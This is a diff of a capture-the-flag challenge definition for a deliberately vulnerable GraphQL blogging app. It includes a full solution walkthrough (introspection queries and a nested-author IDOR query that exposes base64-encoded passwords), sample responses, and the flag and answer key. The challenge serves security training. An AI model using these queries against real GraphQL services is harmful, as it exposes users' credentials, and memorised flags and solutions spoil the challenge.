@@ -3,220 +3,220 @@ secret: true
 static: false
 tag: we_Postbook-Side-Door
 od: |
-  # PostbookSideDoor
+    # PostbookSideDoor
 
-  This challenge is a GraphQL IDOR exploitation. The goal of this challenge is to find the flag, that is located in an exposed password field. Your goal is to find a GraphQL query endpoint that reveals the blog users passwords. One of these passwords has the challenge flag hidden inside of it.
-  # Flag
+    This challenge is a GraphQL IDOR exploitation. The goal of this challenge is to find the flag, that is located in an exposed password field. Your goal is to find a GraphQL query endpoint that reveals the blog users passwords. One of these passwords has the challenge flag hidden inside of it.
+    # Flag
 
-  flag{WASNTTHISASHITSHOW}
+    FIRE{GR4PHQL_1D0R_S1D3_D00R}
 
-  # Description
+    # Description
 
-  Proposed difficulty: very easy
+    Proposed difficulty: very easy
 
-  Are you a fan of blogging?
+    Are you a fan of blogging?
 
-  # Prerequisites & Outcomes
+    # Prerequisites & Outcomes
 
-  **Prerequisites**
+    **Prerequisites**
 
-  * Knowledge of Web and GraphQL basics 
-  * Knowledge on how decoding works
+    * Knowledge of Web and GraphQL basics 
+    * Knowledge on how decoding works
 
-  **Outcomes**
+    **Outcomes**
 
-  * Experience with nested GraphQL objects
-  * Understanding how different queries refer to the same objects and fields
+    * Experience with nested GraphQL objects
+    * Understanding how different queries refer to the same objects and fields
 
-  # Solutions
+    # Solutions
 
-  **Possible Solution 1**
+    **Possible Solution 1**
 
-  1. Create an account with any name and password.
-  2. Once logged in, you can access the profile page from the navbar.
-  3. In the profile page the app tries to send a GraphQL query called GetUser, which you can find in the network tab.
+    1. Create an account with any name and password.
+    2. Once logged in, you can access the profile page from the navbar.
+    3. In the profile page the app tries to send a GraphQL query called GetUser, which you can find in the network tab.
 
-  ```GraphQL
-      query GetDetailedUserInfo($userId: Int!) {
-          getUser(UserId: $userId) {
-              id
-              name
-              hashedPassword
-          }
-      }
-  ```
+    ```GraphQL
+        query GetDetailedUserInfo($userId: Int!) {
+            getUser(UserId: $userId) {
+                id
+                name
+                hashedPassword
+            }
+        }
+    ```
 
-  4. This query requires admin authentication, therefore the response will be "Unauthorized access to detailed user data"
+    4. This query requires admin authentication, therefore the response will be "Unauthorized access to detailed user data"
 
-  ```json
-  {
-      "data": null,
-      "errors": [
-          {
-              "message": "Unauthorized access to detailed user data",
-              "locations": [
-                  {
-                      "line": 3,
-                      "column": 29
-                  }
-              ],
-              "path": [
-                  "getUser"
-              ]
-          }
-      ]
-  }
-  ```
+    ```json
+    {
+        "data": null,
+        "errors": [
+            {
+                "message": "Unauthorized access to detailed user data",
+                "locations": [
+                    {
+                        "line": 3,
+                        "column": 29
+                    }
+                ],
+                "path": [
+                    "getUser"
+                ]
+            }
+        ]
+    }
+    ```
 
-  5. Even though the response doesn't give anything, from the query itself you can figure out the that the user object has the field `hashedPassowrd`.
+    5. Even though the response doesn't give anything, from the query itself you can figure out the that the user object has the field `hashedPassowrd`.
 
-  6. Now knowing the fields that the `User` object has, in the index page there is the GraphQL query called `getAllPosts` which returns an array of posts, which have the `author` field, which is a nested `User` object.
+    6. Now knowing the fields that the `User` object has, in the index page there is the GraphQL query called `getAllPosts` which returns an array of posts, which have the `author` field, which is a nested `User` object.
 
-  7. Query `getAllPosts` with the author argument containing the field hashedPassword.
+    7. Query `getAllPosts` with the author argument containing the field hashedPassword.
 
-  ```GraphQL
-  query GetAllPosts {
-      getAllPosts {
-          author {
-              hashedPassword
-          }
-      }
-  }
-  ```
-  Response:
-  ```json
-  {
-      "data": {
-          "getAllPosts": [
-              {
-                  "author": {
-                      "hashedPassword": "Sm9obiBEb2U6c2VjcmV0"
-                  }
-              },
-              ...
-  ```
-  4. Recognize that the passwords are not in fact hashed but encoded with base64.
+    ```GraphQL
+    query GetAllPosts {
+        getAllPosts {
+            author {
+                hashedPassword
+            }
+        }
+    }
+    ```
+    Response:
+    ```json
+    {
+        "data": {
+            "getAllPosts": [
+                {
+                    "author": {
+                        "hashedPassword": "Sm9obiBEb2U6c2VjcmV0"
+                    }
+                },
+                ...
+    ```
+    4. Recognize that the passwords are not in fact hashed but encoded with base64.
 
-  5. Loop through each password by decoding it, until you find the flag:
+    5. Loop through each password by decoding it, until you find the flag:
 
-  Encoded flag: `QsO4cmdlIFNtw7hycmVicsO4ZHNlbjpmbGFne1dBU05UVEhJU0FTSElUU0hPV30=` => Decoded: `Børge Smørrebrødsen:flag{WASNTTHISASHITSHOW}`
+    Encoded flag: `QsO4cmdlIFNtw7hycmVicsO4ZHNlbjpGSVJFe0dSNFBIUUxfMUQwUl9TMUQzX0QwMFJ9` => Decoded: `Børge Smørrebrødsen:FIRE{GR4PHQL_1D0R_S1D3_D00R}`
 
-  **Possible Solution 2**
+    **Possible Solution 2**
 
-  1. Open a tool where you can query GraphQL (like Postman), explore all the queries and fields with Through the GUI. Or send a query request like this:
-  ```GraphQL
-  {
-    __schema {
-      types {
-        name
-        kind
+    1. Open a tool where you can query GraphQL (like Postman), explore all the queries and fields with Through the GUI. Or send a query request like this:
+    ```GraphQL
+    {
+      __schema {
+        types {
+          name
+          kind
+        }
       }
     }
-  }
-  ```
-  This query will return all types that are in the schema
+    ```
+    This query will return all types that are in the schema
 
-  ```json
-  {
-      "data": {
-          "__schema": {
-              "types": [
-                  {
-                      "name": "Query",
-                      "kind": "OBJECT"
-                  },
-                  {
-                      "name": "UserType",
-                      "kind": "OBJECT"
-                  },
+    ```json
+    {
+        "data": {
+            "__schema": {
+                "types": [
+                    {
+                        "name": "Query",
+                        "kind": "OBJECT"
+                    },
+                    {
+                        "name": "UserType",
+                        "kind": "OBJECT"
+                    },
 
-                  {
-                      "name": "PostType",
-                      "kind": "OBJECT"
-                  },
-                  ...
-              
-  ```
-  2. From the query above, you can find that the `PostType ` exists. Which then can be explored in more detail by querying:
-  ```GraphQL
-  {
-    __type(name: "PostType") {
-      name
-      fields {
+                    {
+                        "name": "PostType",
+                        "kind": "OBJECT"
+                    },
+                    ...
+                
+    ```
+    2. From the query above, you can find that the `PostType ` exists. Which then can be explored in more detail by querying:
+    ```GraphQL
+    {
+      __type(name: "PostType") {
         name
-        type {
-          ofType {
-            name
-            kind
+        fields {
+          name
+          type {
+            ofType {
+              name
+              kind
+            }
           }
         }
       }
     }
-  }
-  ```
-  That returns:
-  ```json
-  {
-      "data": {
-          "__type": {
-              "name": "PostType",
-              "fields": [
+    ```
+    That returns:
+    ```json
+    {
+        "data": {
+            "__type": {
+                "name": "PostType",
+                "fields": [
 
-              ...
+                ...
 
-                  {
-                      "name": "author",
-                      "type": {
-                          "ofType": {
-                              "name": "UserType",
-                              "kind": "OBJECT"
-                          }
-                      }
-                  }
-              ]
-          }
-      }
-  }
+                    {
+                        "name": "author",
+                        "type": {
+                            "ofType": {
+                                "name": "UserType",
+                                "kind": "OBJECT"
+                            }
+                        }
+                    }
+                ]
+            }
+        }
+    }
 
-  ```
-  3. From the response, you can see that there is a clear relationship between the `PostType` and the `UserType` through the `author` field.
-  4. Now using this knowledge, query
-  `findAllPosts`, which has the `author` field that contains the encoded user passwords. 
-  5. Loop through the passwords, recognize that it's encoded with base64, decode it and find the flag (same as the solution above from step 4).
+    ```
+    3. From the response, you can see that there is a clear relationship between the `PostType` and the `UserType` through the `author` field.
+    4. Now using this knowledge, query
+    `findAllPosts`, which has the `author` field that contains the encoded user passwords. 
+    5. Loop through the passwords, recognize that it's encoded with base64, decode it and find the flag (same as the solution above from step 4).
 
-  # How to run challenge locally
-  1. Populate the `.env.example` file with the environment variables and rename it to `.env`.
-  2. Make sure you have Docker Engine running.
-  3. Run the following command to start the challenge:
-  ```bash
-  docker compose build --no-cache;
-  docker compose up -d;
-  ```
-  4. The challenge should be running on `http://localhost:8080`.
+    # How to run challenge locally
+    1. Populate the `.env.example` file with the environment variables and rename it to `.env`.
+    2. Make sure you have Docker Engine running.
+    3. Run the following command to start the challenge:
+    ```bash
+    docker compose build --no-cache;
+    docker compose up -d;
+    ```
+    4. The challenge should be running on `http://localhost:8080`.
 
 instance:
-  - image: ghcr.io/campfire-security/PostbookSideDoor
-    dns:
-      - name: PostbookSideDoor.cfire
-        type: A
-    flags:
-      - tag: Postbook-Side-Door-1
-        name: Postbook Side Door
-        static: FIRE{W45N7TH154SH17SH0W}
-        points: 1
-        category: Web Exploitation
-        td: |
-          Ever wondered what happens when developers get a little too... sharing? 🤫
-          
-          Dive into this trendy blogging platform and see if you can uncover some juicy secrets that probably shouldn't be there.
-          Sometimes the best doors are the ones left wide open! 🚪✨
+    - image: ghcr.io/campfire-security/PostbookSideDoor
+      dns:
+          - name: PostbookSideDoor.cfire
+            type: A
+      flags:
+          - tag: Postbook-Side-Door-1
+            name: Postbook Side Door
+            static: FIRE{GR4PHQL_1D0R_S1D3_D00R}
+            points: 1
+            category: Web Exploitation
+            td: |
+                Ever wondered what happens when developers get a little too... sharing? 🤫
 
-          Welcome to the hottest blogging platform on the web! 📝✨
-          
-          Something tells us there's more than just blog posts hiding in this GraphQL paradise... 
-          Can you find what the developers accidentally left exposed? 
-                  
-          Happy hunting! 🕵️‍♀️
+                Dive into this trendy blogging platform and see if you can uncover some juicy secrets that probably shouldn't be there.
+                Sometimes the best doors are the ones left wide open! 🚪✨
 
-          Go to:
-          `http://PostbookSideDoor.cfire/`
+                Welcome to the hottest blogging platform on the web! 📝✨
+
+                Something tells us there's more than just blog posts hiding in this GraphQL paradise... 
+                Can you find what the developers accidentally left exposed? 
+                        
+                Happy hunting! 🕵️‍♀️
+
+                Go to:
+                `http://PostbookSideDoor.cfire/`
